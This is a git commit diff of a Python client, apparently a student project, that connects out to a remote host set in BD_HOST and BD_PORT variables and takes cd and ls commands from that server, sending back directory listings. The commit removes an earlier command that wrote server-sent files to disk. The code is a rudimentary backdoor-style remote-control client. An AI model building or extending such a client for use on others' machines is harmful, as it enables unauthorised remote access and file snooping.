4ebfa8c98e8b5ba9741ee074260a7d887c1e2c75
Linus <s_widing21@stud.hwr-berlin.de>
2023-06-19 18:02:06 +0200

    Remaking client.py

--- Client/client.py
+++ Client/client.py
@@ -4,8 +4,9 @@ import time
 
 REMOTE_HOST = str(os.environ.get("BD_HOST"))
 REMOTE_PORT = int(os.environ.get("BD_PORT"))
-print("Host: " + REMOTE_HOST + " type: " + str(type(REMOTE_HOST)))
-print("Port: " + str(REMOTE_PORT) + " type: " + str(type(REMOTE_PORT)))
+
+print("SET REMOTE_HOST: " + str(REMOTE_HOST))
+print("SET REMOTE_PORT: " + str(REMOTE_PORT))
 server = socket.socket()
 print("[-] Connection Initiating...")
 while True:
@@ -18,13 +19,12 @@ while True:
 
 print("[-] Connection initiated!")
 restart = False
-wd = os.getcwd()
-server.send(wd.encode("UTF-8"))
+pwd = os.getcwd()
+server.send(pwd.encode("UTF-8"))
 
 while True:
-    old_path = wd
-    if restart:
-        server.send(wd.encode("UTF-8"))
+    output = ""
+
     print("[-] Awaiting commands...")
     recvString = server.recv(1024)
     recvString = recvString.decode()
@@ -32,56 +32,19 @@ while True:
     command = inputList[0]
     args = inputList.copy()
     del (args[0])
-    if command == "quit":
-        restart = True
-    elif command == "cd":
-        arg = args[0]
-        if arg == "..":
-            newPath = ""
-            pathList = wd.split("/")
-            del (pathList[-1])
-            for s in pathList:
-                newPath = newPath + s + "/"
-            newPath = newPath[:-1]
-            wd = newPath
-            server.send(wd.encode("UTF-8"))
-            continue
-        if arg[0] == "/":
-            print("test")
-            if os.path.exists(arg):
-                wd = arg
-            else:
-                print("invalid path")
-                wd = "invalid"
+
+    if command == "cd":
+        new_path = os.path.join(pwd, args[0])
+        if os.path.exists(new_path) and os.path.isdir(new_path):
+            pwd = os.path.abspath(new_path)
+            output = pwd
         else:
-            newPath = wd + "/" + arg
-            print(newPath)
-            if os.path.exists(newPath):
-                wd = newPath
-            else:
-                print("invalid path")
-                wd = "invalid"
-
-        server.send(wd.encode("UTF-8"))
-        if wd == "invalid":
-            wd = old_path
-
+            output = "Invalid Path!"
     elif command == "ls":
-        output = ""
-        for s in sorted(os.listdir(wd)):
-            output = output + "\n" + s
-        server.send(output.encode("UTF-8"))
-
-    elif command == "send":
-        recvFileName = server.recv(1024)
-        recvFileName = recvFileName.decode()
-        recvFileData = server.recv(1000000)
-        lul = wd + recvFileName
-        if not os.path.exists(wd + "\\" + recvFileName):
-            newFile = open(recvFileName, "wb")
-            newFile.write(recvFileData)
-            newFile.close()
-            server.send("success".encode("UTF-8"))
-        else:
-            server.send("failed".encode("UTF-8"))
-
+        for s in sorted(os.listdir(pwd)):
+            if "-a" in args:
+                output = output + "\n" + s
+            else:
+                if not s.startswith("."):
+                    output = output + "\n" + s
+    server.send(output.encode("UTF-8"))
